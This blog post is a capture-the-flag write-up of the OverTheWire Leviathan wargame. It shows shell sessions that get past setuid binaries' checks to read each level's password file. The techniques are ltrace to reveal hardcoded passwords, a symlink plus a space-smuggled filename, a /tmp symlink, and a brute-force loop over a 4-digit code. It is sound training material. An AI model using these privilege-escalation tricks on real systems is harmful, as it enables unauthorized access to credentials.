---
layout:     post
title:      "Overthewire.org - Leviathan"
subtitle:   "Write-Up"
date:       2016-07-25 10:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
category: Write-Ups
---

<h1>Introduction</h1>

<p>Today we're gonna give a try Leviathan wargame which requires some common sense and a little bit of knowledge about Unix commands.</p>
<p>Let's get started!</p>

<b>0 --> 1</b>
<p>First thing is to login into the leviathan0 account using SSH. Then we're gonna take a look at home directory using <i>ls -la</i> command.</p>
{% highlight bash %}
leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
drwxr-x---   2 leviathan1 leviathan0 4096 May 15 02:15 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
{% endhighlight %}
<p>Rresults show us an hidden backup folder, containing a file called bookmarks.html.</p>
{% highlight bash %}
leviathan0@melinda:~$ cd .backup
leviathan0@melinda:~/.backup$ ls -la
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 May 15 02:15 .
drwxr-xr-x 3 root       root         4096 Nov 14  2014 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Nov 14  2014 bookmarks.html
{% endhighlight %}
<p>Searching the file manually will probably take us years so why not to grep string with a word password?</p>
{% highlight bash %}
leviathan0@melinda:~/.backup$ cat bookmarks.html | grep password

<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is *******" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
{% endhighlight %}

<b>1 --> 2</b>
<p>Once again let's view the files in the main directory, but now we have a file called check.</p>
{% highlight bash %}
leviathan1@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan2 leviathan1 7493 Nov 14  2014 check
{% endhighlight %}
<p>After running, it asks us for a password, maybe running <i>ltrace</i> will find anything useful.</p>
{% highlight bash %}
leviathan1@melinda:~$ ./check
password: password
Wrong password, Good Bye ...
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 <unfinished ...>
printf("password: ")                                                                                    = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: password
)                                                            = 112
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                            = 97
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                            = 115
strcmp("pas", "sex")                                                                                    = -1
puts("Wrong password, Good Bye" ...Wrong password, Good Bye ...
)                                                                    = 29
+++ exited (status 0) +++
{% endhighlight %}
<p>Yeah, it's comparing our password with 'sex' using strcmp function, so 'sex' is desired password.</p>
{% highlight bash %}
leviathan1@melinda:~$ ./check
password: sex
$ cat /etc/leviathan_pass/leviathan2
*******
{% endhighlight %}
<p>After entering pass correctly, we are given a shell where we can view the password for the next level.</p>

<b>2 --> 3</b>
<p>We are given a printfile file, which usage is printing files (obviously :D). We can try, and check a simple trick.</p>
{% highlight bash %}
leviathan2@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile

leviathan2@melinda:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
{% endhighlight %}
<p>:(</p>
<p>Now we have to try something different. Firstly create a directory in /tmp.Next step will be creating 2 files: first called pass which is symbolic link to our password file and then file called pass qwer, you can name them however you want but the trick is that second file needs to have first file name in the first half of the second one like this.</p>
{% highlight bash %}
leviathan2@melinda:~$ mkdir /tmp/w3nditor
leviathan2@melinda:~$ cd /tmp/w3nditor
leviathan2@melinda:/tmp/w3nditor$ ln -s /etc/leviathan_pass/leviathan3 ./pass
leviathan2@melinda:/tmp/w3nditor$ touch pass\ qwer
{% endhighlight %}
<p>Then we can use our printfile on previously created pass qwer. What the trick does, is that it firstly allows us to access because the pass qwer exists and then cat command treats them as two seperate files so we can view the password through previously created symbolic link.</p>
{% highlight bash %}
leviathan2@melinda:~$ ./printfile /tmp/w3nditor/pass\ qwer
*******
/bin/cat: qwer: No such file or directory
{% endhighlight %}

<b>3 --> 4</b>
<p>In this one, we get file called level3 that after executing asks us for a password.</p>
{% highlight bash %}
leviathan3@melinda:~$ ls -la
total 32
drwxr-xr-x   2 root       root       4096 Mar 21  2015 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan4 leviathan3 9962 Mar 21  2015 level3
leviathan3@melinda:~$ ./level3
Enter the password> password
bzzzzzzzzap. WRONG
{% endhighlight %}
<p>Let’s once again use ltrace to check for anything useful.</p>
{% highlight bash %}
leviathan3@melinda:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd7a4, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                       = -1
printf("Enter the password> ")                   = 20
fgets(Enter the password> password
"password\n", 256, 0xf7fc9c20)             = 0xffffd59c
strcmp("password\n", "snlprintf\n")              = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                       = 19
+++ exited (status 0) +++
{% endhighlight %}
<p>In this level, it uses strcmp between our string and ‘snlprintf’.</p>
{% highlight bash %}
leviathan3@melinda:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
*******
{% endhighlight %}
<p>And it works perfectly!</p>

<b>4 --> 5</b>
{% highlight bash %}
leviathan4@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root       4096 Nov 14  2014 .
drwxr-xr-x 172 root root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root root        675 Apr  9  2014 .profile
dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
leviathan4@melinda:~$ cd .trash
leviathan4@melinda:~/.trash$ ls -la
total 16
dr-xr-x--- 2 root       leviathan4 4096 Nov 14  2014 .
drwxr-xr-x 3 root       root       4096 Nov 14  2014 ..
-r-sr-x--- 1 leviathan5 leviathan4 7425 Nov 14  2014 bin
leviathan4@melinda:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
{% endhighlight %}
<p>From this one, we get a binary string which after converting to ASCII gives: ******* – password for next level.</p>

<b>5 --> 6</b>
<p>Now we get a file that is somehow looking for /tmp/file.log</p>
{% highlight bash %}
leviathan5@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
leviathan5@melinda:~$ ./leviathan5
Cannot find /tmp/file.log
{% endhighlight %}
<p>Creating link in /tmp/file.log to leviathan pass let’s us see a password.</p>
{% highlight bash %}
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5
*******
{% endhighlight %}

<b>6 --> 7</b>
<p>This time we’ve got executable which asks for a 4 digit code.</p>
{% highlight bash %}
leviathan6@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan7 leviathan6 7484 Nov 14  2014 leviathan6
leviathan6@melinda:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@melinda:~$ ./leviathan6 1111
Wrong
{% endhighlight %}
<p>Only way to get access will be brute forcing the pass code.  We can use any programming language but this time I’ll try to write simple bash script.</p>
{% highlight bash %}
leviathan6@melinda:~$ for i in {0000..9999}; do ./leviathan6 $i; echo $i; done

Wrong
7119
Wrong
7120
Wrong
7121
Wrong
7122
$ cat /etc/leviathan_pass/leviathan7
*******
$
{% endhighlight %}
<p>And here we go! We’ve got the password!</p>

<p>Thanks for the challenge! Hope you enjoyed solving this problems as much as I had.</p>
<p>~Stay safe!</p>
